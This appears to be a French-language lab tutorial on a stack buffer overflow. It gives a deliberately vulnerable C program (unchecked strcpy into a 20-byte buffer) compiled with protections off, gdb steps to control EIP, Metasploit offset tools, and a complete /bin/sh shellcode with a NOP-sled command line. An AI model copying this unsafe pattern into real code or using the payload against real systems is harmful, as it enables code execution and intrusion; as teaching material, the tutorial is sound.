```c
#include <stdio.h>
#include <string.h>

void vuln(char *arg){
	char buffer[20];
	strcpy(buffer, arg);
	printf("\n Hello %s ! \n", buffer);
}  

int main(int argc, char **argv){
	vuln(argv[1]);
	return 0;
}
```

```sh
gcc -z execstack -fno-stack-protector -m32 sayHello.c -o run
```

**Take Controle of EIP**

Avec `gdb`, envoyer un nombre important de 'A' au programme jusqu'a obtenir une erreur soit (`SIGSEGV, Segementation fault`)

```sh
(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

A partir des informations du registre `info registers`, verifier que nous avons bien écrasé sur `EIP` et qu'il a les valeurs `A` soit `0x41414141`

---

**Finding the offset**

Maintenant il faut chercher le `offset` c'est la taille exact qu'il faut pour écrasé sur `EIP`

```sh
msf-pattern_create -l 100
```

Executer la sortie de la commande dans `gdb` 

```sh
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4A...
```

Verifier que `EIP` a une nouvelle valeur, prendre cette valeur et trouver l'`offset` correspondant.

```sh
msf-pattern_offset -q {EIP_VALUE}
```

Ceci vas retourner une valeur qui sera la taille de note offset (`size-offset`)

Donc il nous faut `size-offset` caractere suivie de notre shellcode. 
En gros tout ce qui se trouve au dela de la taille de notre offset vas etre executer en memoire dans `EBP`

En suite

```sh
(gdb) run $(python2 -c "print 'A'*{size-offset}")
```

Le programme vas planter et on verifie le registrer `ESP`

```sh
(gdb) info frame
(gdb) print $esp 
# => 0xffffcee0
```

---

**Generating Shellcode**

Il faut ecrire la valeur de ESP en envers soit `\xe0\xce\xff\xff` -> `{esp-reverse}`

ShellCode:

```sh
\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh
```

Executer le programme pour obtenir un shell

```sh
./run $(python2 -c "print 'A'*{size-offset} + '{esp-reverse}' + '\x90'*40 + '{shellcode}'")
```

> __NOTE:__ Si nous avons les caracteres `1�Ph//shh/bin��PS��` il faut augmenter le nombre `NOPs`


